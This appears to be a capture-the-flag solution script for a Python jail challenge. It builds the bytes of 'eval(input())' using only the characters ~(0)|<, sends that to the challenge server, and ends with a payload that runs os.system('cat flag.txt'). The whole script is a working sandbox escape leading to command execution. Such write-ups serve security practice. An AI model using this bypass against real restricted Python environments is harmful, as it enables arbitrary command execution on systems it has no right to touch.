import socket
# eval(input())
bits = bin(0x6576616c28696e707574282929)[2:]
one = "(~0<0)"
arr = []

HOST = "chal.bearcatctf.io"  # The server's hostname or IP address
PORT = 35707  # The port used by the server

def conv_num(num):
    # allowed: ~(0)|<
    # we can get each bit with:
    # (~0<0)<<0 - 1
    # (~0<0)<<((~0<0)<<0) - 2
    # etc.
    bits_num = bin(num)[2:]
    arr2 = []
    if num == 0: return "0"
    for i in range(0, len(bits_num)):
        if bits_num[i] == "1":
            arr2.append("((~0<0)<<0" + ("<<((~0<0)<<0)" * (len(bits_num) - i - 1)) + ")")
    final = "|".join(arr2)
    return final
for i in range(0, len(bits)):
    if bits[i] == "1":
        arr.append(f"({one}<<({(conv_num(len(bits)-i-1))}))")
    
z = "|".join(arr)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    # How are you doing?
    data = s.recv(10000)
    print(data)
    s.sendall(z.encode("ascii") + b"\n")
    data = s.recv(10000)
    print(data)
    # What is your name?
    s.sendall(b"[13,\"big\"]\n")
    data = s.recv(10000)
    print(data)
    # Choose your inmate
    s.sendall(b"to_bytes\n")
    data = s.recv(10000)
    print(data)
    # Choose your cell
    s.sendall(b"eval\n")
    data = s.recv(10000)
    print(data)
    # Win it
    s.sendall(b"print(__import__('os').system('cat flag.txt'))\n")
    data = s.recv(10000)
    print(data)
    data = s.recv(10000)
    print(data)